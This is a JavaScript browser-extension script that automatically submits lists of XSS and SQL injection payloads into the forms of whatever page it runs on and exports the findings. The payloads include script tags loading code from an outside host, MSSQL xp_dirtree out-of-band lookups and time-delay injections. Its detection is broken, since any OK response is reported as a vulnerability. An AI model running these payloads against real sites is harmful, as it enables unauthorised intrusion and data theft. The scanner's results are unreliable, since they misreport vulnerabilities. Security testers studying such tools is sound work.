let scanStarted = false;

if (!scanStarted) {
    scanStarted = true;

    console.log("Starting Scan...");
    logToUI("Starting Scan...");

    function filterRelevantForms(forms) {
        return Array.from(forms).filter(form => {
            return Array.from(form.elements).some(input => {
                return input.type === 'text' || input.type === 'search';
            });
        });
    }

    // XSS Payloads
    const xssPayloads = [
        "';alert(String.fromCharCode(88,83,83))//",
        "';alert(String.fromCharCode(88,83,83))//\"",
        "<script>alert('xss')</script>",
        "//--></SCRIPT>\"'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
        "'';!--\"<XSS>=&{()}",
        "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>",
        "<IMG SRC=\"javascript:alert('XSS');\">",
        "<IMG SRC=javascript:alert('XSS')>",
        "<IMG SRC=javascrscriptipt:alert('XSS')>",
        "<IMG SRC=JaVaScRiPt:alert('XSS')>",
        "<IMG \"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
        "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
        "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
        "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
        "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
        "<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>",
        "\";alert('XSS');//",
        "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>",
        "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">",
        "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
        "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">",
        "<DIV STYLE=\"width: expression(alert('XSS'));\"></DIV>"
    ];

    // SQL Injection Payloads
    const sqliPayloads = [
        "'",
        "''",
        "\\",
        "\\\\",
        "\\'",
        "{base}-0",
        "{base}*1",
        "{base}'||'",
        "{base}'+",
        "{base}' ",
        "{base}'.'",
        "{base}',",
        "\"",
        "\"\"",
        "' OR '1'='1",
        "' OR '1'='1' -- ",
        "' OR '1'='1' /*",
        "' OR '1'='1' -- -",
        "' OR 'a'='a",
        "' OR 'a'='a' -- ",
        "' OR 'a'='a' /*",
        "' OR 'a'='a' -- -",
        "' OR 1=1 -- ",
        "' OR 1=1 /*",
        "' OR 1=1 -- -",
        "\\\"",
        "{base}\"||\"",
        "{base}\"+",
        "{base}\",",
        "{base}/*_*/",
        "{base}/*x*/",
        "{base}|0",
        "'{base}'",
        "\"{base}\"",
        "({base})",
        "{base}'--",
        "{base}')--",
        "{base}'));--",
        "{base}')))--",
        "{base}'));--",
        "{base}'#",
        "{base}')#",
        "{base}');#",
        "{base}'))#",
        "{base}')#",
        "{base}\"#",
        "{base}\")#",
        "{base}\";--",
        "{base}' or 'z'='z",
        "1 or 7=7",
        "' OR 1 -- -",
        "{base} or 7=7",
        "{base}' or 7=7--",
        "{base}' or 7=7#",
        "{base}' or 7=7)--",
        "{base}' or 7=7)#",
        "{base}' or 'z'='z",
        "{base}' or 'z'='z' or 'a'='b",
        "{base}'/**/or/**/'z'='z",
        "{base}' or username like '%",
        "{base}' or id like '%",
        "{base}' or user like '%",
        "{base}' or @version like '%",
        "{base}' or version() like '%",
        "{base}') or ('x'='x",
        "{base}')) or (('x'='x",
        "{base}' and 7=7",
        "{base}' and 7=7--",
        "{base}' and 7=7#",
        "{base}\' and 7=7--",
        "{base}\' and 7=7#",
        "\" or \"z\"=\"z",
        "{base}\" or 7=7",
        "{base}\" or 7=7--",
        "{base}\" or 7=7#",
        "{base}\" or \"z\"=\"z",
        "{base}\" or \"z\"=\"z\" or \"a\"=\"b",
        "{base}\"/**/or/**/\"z\"=\"z",
        "{base}\" or username like \"%",
        "{base}\" or id like \"%",
        "{base}\" or user like \"%",
        "{base}\" or @version like \"%",
        "{base}\" or version() like \"%",
        "{base}\") or (\"x\"=\"x",
        "{base}\")) or (\"x\"=\"x",
        "{base}\" and 7=7",
        "{base}\" and 7=7--",
        "{base}\" and 7=7#",
        "{base}\";DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\\s');EXEC(@x)--",
        "{base}\"');DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\\s');EXEC(@x)--",
        "{base}\"\";DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\\s');EXEC(@x)--",
        "{base}' waitfor delay '0:0:20'--",
        "{base}'(select*from(select(sleep(20)))a)'",
        "{base}' (select*from(select(sleep(20)))a) '",
        "{base}' and (select*from(select(sleep(20)))a)--",
        "{base},(select*from(select(sleep(20)))a)",
        "tz_offset"
    ];

    async function scanForXSS() {
        let forms = filterRelevantForms(document.forms);
        let vulnerableForms = new Map();

        console.log("Scanning for XSS...");
        logToUI("Scanning for XSS...");

        for (let form of forms) {
            for (let input of form) {
                if (input.type === 'text') {
                    for (let payload of xssPayloads) {
                        console.log(`Testing form with action: ${form.action}`);
                        logToUI(`Testing form with action: ${form.action}`);

                        let originalAction = form.action || window.location.href;
                        let formData = new FormData(form);
                        formData.set(input.name, payload);

                        try {
                            let response = await fetch(originalAction, {
                                method: 'POST',
                                body: formData,
                                headers: {
                                    'Content-Type': 'application/x-www-form-urlencoded'
                                }
                            });
                            if (response.ok) {
                                if (!vulnerableForms.has(originalAction)) {
                                    vulnerableForms.set(originalAction, []);
                                }
                                vulnerableForms.get(originalAction).push(payload);
                                console.log(`XSS potentially found on: ${originalAction}`);
                                logToUI(`XSS potentially found on: ${originalAction}`);
                            }
                        } catch (error) {
                            console.error('Error during XSS scan:', error);
                            logToUI(`Error during XSS scan: ${error}`);
                        }
                    }
                }
            }
        }
        return vulnerableForms;
    }

    async function scanForSQLi() {
        let forms = filterRelevantForms(document.forms);
        let vulnerableForms = new Map();

        console.log("Scanning for SQL Injection...");
        logToUI("Scanning for SQL Injection...");

        for (let form of forms) {
            for (let input of form) {
                if (input.type === 'text' || input.type === 'search') {
                    for (let payload of sqliPayloads) {
                        console.log(`Testing form with action: ${form.action}`);
                        logToUI(`Testing form with action: ${form.action}`);

                        let originalAction = form.action || window.location.href;
                        let formData = new FormData(form);
                        formData.set(input.name, payload.replace(/{base}/g, ''));

                        try {
                            let response = await fetch(originalAction, {
                                method: 'POST',
                                body: formData,
                                headers: {
                                    'Content-Type': 'application/x-www-form-urlencoded'
                                }
                            });
                            if (response.ok) {
                                if (!vulnerableForms.has(originalAction)) {
                                    vulnerableForms.set(originalAction, []);
                                }
                                vulnerableForms.get(originalAction).push(payload);
                                console.log(`SQL Injection potentially found on: ${originalAction}`);
                                logToUI(`SQL Injection potentially found on: ${originalAction}`);
                            }
                        } catch (error) {
                            console.error('Error during SQL Injection scan:', error);
                            logToUI(`Error during SQL Injection scan: ${error}`);
                        }
                    }
                }
            }
        }
        return vulnerableForms;
    }

    async function runScan() {
        try {
            let xssVulnerableForms = await scanForXSS();
            let sqliVulnerableForms = await scanForSQLi();

            if (xssVulnerableForms.size > 0) {
                logToUI("XSS Vulnerable: Yes");
                xssVulnerableForms.forEach((payloads, url) => {
                    logToUI(url);
                    payloads.forEach(payload => {
                        logToUI(`Payload: ${payload}`);
                    });
                });
            } else {
                logToUI("No XSS vulnerabilities found.");
            }

            if (sqliVulnerableForms.size > 0) {
                logToUI("SQL Injection Vulnerable: Yes");
                sqliVulnerableForms.forEach((payloads, url) => {
                    logToUI(url);
                    payloads.forEach(payload => {
                        logToUI(`Payload: ${payload}`);
                    });
                });
            } else {
                logToUI("No SQL Injection vulnerabilities found.");
            }

            // Export results
            addExportButton(xssVulnerableForms, sqliVulnerableForms);

            console.log("Scan Completed", { xssVulnerableForms, sqliVulnerableForms });
            logToUI("Scan Completed");

            chrome.runtime.sendMessage({
                xss: Array.from(xssVulnerableForms.entries()),
                sqli: Array.from(sqliVulnerableForms.entries())
            });

            scanStarted = false;
        } catch (error) {
            console.error('Error during scan:', error);
            logToUI(`Error during scan: ${error}`);
            scanStarted = false;
        }
    }

    runScan();
}

function logToUI(message) {
    chrome.runtime.sendMessage({
        log: message
    });
}

function addExportButton(xssVulnerableForms, sqliVulnerableForms) {
    // Create a button for exporting
    const exportButton = document.createElement('button');
    exportButton.textContent = 'Export Results';
    exportButton.style.position = 'fixed';
    exportButton.style.bottom = '10px';
    exportButton.style.right = '10px';
    exportButton.style.zIndex = 1000;
    exportButton.onclick = () => {
        exportResults(xssVulnerableForms, sqliVulnerableForms);
    };
    document.body.appendChild(exportButton);
}

function exportResults(xssVulnerableForms, sqliVulnerableForms) {
    // Convert to CSV format
    let csvContent = "data:text/csv;charset=utf-8,Type,URL,Payload\n";

    xssVulnerableForms.forEach((payloads, url) => {
        payloads.forEach(payload => {
            csvContent += `XSS,${url},${payload}\n`;
        });
    });

    sqliVulnerableForms.forEach((payloads, url) => {
        payloads.forEach(payload => {
            csvContent += `SQLi,${url},${payload}\n`;
        });
    });

    // Download the CSV file
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement("a");
    link.setAttribute("href", encodedUri);
    link.setAttribute("download", "scan_results.csv");
    document.body.appendChild(link); // Required for Firefox
    link.click();

    // Convert to JSON format
    const jsonResults = {
        XSS: Array.from(xssVulnerableForms.entries()).map(([url, payloads]) => ({ url, payloads })),
        SQLi: Array.from(sqliVulnerableForms.entries()).map(([url, payloads]) => ({ url, payloads }))
    };

    // Download the JSON file
    const jsonBlob = new Blob([JSON.stringify(jsonResults, null, 2)], { type: "application/json" });
    const jsonUrl = URL.createObjectURL(jsonBlob);
    const jsonLink = document.createElement("a");
    jsonLink.href = jsonUrl;
    jsonLink.setAttribute("download", "scan_results.json");
    document.body.appendChild(jsonLink); // Required for Firefox
    jsonLink.click();
}
